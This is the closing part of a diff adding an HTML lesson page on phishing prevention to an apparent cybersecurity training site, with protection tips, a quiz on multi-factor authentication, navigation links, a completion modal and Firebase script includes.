+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <h3 class="protection-heading">Protection Tips:</h3>
+          <ul class="protection-list">
+            <li>Deploy email authentication protocols (SPF, DKIM, DMARC)</li>
+            <li>Implement AI-based phishing detection</li>
+            <li>Conduct regular security assessments</li>
+            <li>Maintain incident response readiness</li>
+          </ul>
+
+          <!-- Add topic-specific quiz for Prevention -->
+          <div class="topic-quiz">
+            <h4><i class="fas fa-brain"></i> Knowledge Check</h4>
+            <div class="question">
+              <p>
+                Which security measure provides the strongest protection against
+                credential theft in phishing attacks?
+              </p>
+              <div class="options">
+                <div class="option" data-correct="false">
+                  <span class="option-letter">A</span>
+                  <span class="option-text">Regular password changes</span>
+                </div>
+                <div class="option" data-correct="false">
+                  <span class="option-letter">B</span>
+                  <span class="option-text">Email filtering</span>
+                </div>
+                <div class="option" data-correct="true">
+                  <span class="option-letter">C</span>
+                  <span class="option-text">Multi-factor authentication</span>
+                </div>
+                <div class="option" data-correct="false">
+                  <span class="option-letter">D</span>
+                  <span class="option-text">Security awareness training</span>
+                </div>
+              </div>
+            </div>
+            <div class="topic-quiz-results" style="display: none">
+              <p class="correct-answer" style="display: none">
+                Correct! Multi-factor authentication provides an additional
+                layer of security even if credentials are compromised.
+              </p>
+              <p class="incorrect-answer" style="display: none">
+                Incorrect. Try again!
+              </p>
+            </div>
+            <button class="btn btn-primary topic-quiz-btn">Check Answer</button>
+          </div>
+
+          <!-- Progress Tracking Button removed to use quiz-based progress only -->
+        </div>
+      </div>
+
+      <div class="conclusion">
+        <h2>Conclusion</h2>
+        <p>
+          Understanding phishing attacks and implementing comprehensive
+          prevention measures is crucial for protecting individuals and
+          organizations from increasingly sophisticated social engineering
+          threats. Success requires a combination of user awareness, technical
+          controls, and organizational commitment to security.
+        </p>
+      </div>
+
+      <div class="lesson-navigation" style="margin-top: 32px;">
+        <div class="nav-container">
+          <a href="attack-targets.html" class="nav-button back">
+            <i class="fas fa-arrow-left"></i> Back to Attack Targets
+          </a>
+          <a href="malware.html" class="nav-button next">
+            Next Lesson: Malware Attacks <i class="fas fa-arrow-right"></i>
+          </a>
+        </div>
+      </div>
+    </div>
+
+    <footer>
+      <p>&copy; 2025 Cybersec Academy. All rights reserved.</p>
+    </footer>
+
+    <!-- Module Completion Celebration Modal -->
+    <div class="celebration-container">
+      <div class="celebration-content">
+        <div class="achievement-unlocked">Achievement Unlocked!</div>
+        <div class="trophy-animation">
+          <div class="trophy">
+            <i class="fas fa-trophy"></i>
+          </div>
+          <div id="trophy-sparkle" class="trophy-sparkle"></div>
+        </div>
+        <h2 class="celebration-title">Module Completed</h2>
+        <p class="celebration-text">
+          You have completed the Phishing Attacks module! You've learned how to identify, prevent, and respond to a wide range of phishing threats.
+        </p>
+        <div class="celebration-stats">
+          <div class="stat-item">
+            <div class="stat-value">3/3</div>
+            <div class="stat-label">Topics Completed</div>
+          </div>
+          <div class="stat-item">
+            <div class="stat-value">100%</div>
+            <div class="stat-label">Module Progress</div>
+          </div>
+          <div class="stat-item">
+            <div class="stat-value">3/3</div>
+            <div class="stat-label">Knowledge Checks</div>
+          </div>
+        </div>
+        <div class="celebration-badge">
+          <i class="fas fa-envelope-open-text"></i>
+        </div>
+        <button class="celebration-btn">Continue Learning</button>
+      </div>
+    </div>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-analytics.js"></script>
+    <script src="firebase-config.js"></script>
+    <script src="js/phishing-attack.js"></script>
+    <script src="js/mobile-menu.js"></script>
+  </body>
+</html>
